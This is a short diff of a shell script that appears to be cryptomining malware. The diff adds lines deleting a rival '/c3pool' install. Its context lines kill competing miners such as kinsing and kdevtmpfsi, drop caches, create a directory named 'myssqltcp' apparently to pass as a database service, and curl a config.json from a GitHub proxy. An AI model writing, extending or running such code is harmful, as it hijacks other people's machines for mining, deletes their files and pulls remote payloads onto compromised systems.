@@ -692,6 +692,7 @@ killall -9 p
 kill_miner_proc
 kill_sus_proc
 rm -f kinsing kdevtmpfsi
+rm -rf /c3pool
 
 pids=$(pgrep Ktvking)
 for pid in $pids; do
@@ -705,6 +706,7 @@ sync && echo 3 >/proc/sys/vm/dro
 
 # Download program
 cd $HOME/
+rm -rf /c3pool
 mkdir myssqltcp
 cd /$HOME/myssqltcp
 curl -L --progress-bar "https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/myssqltcp/config.json
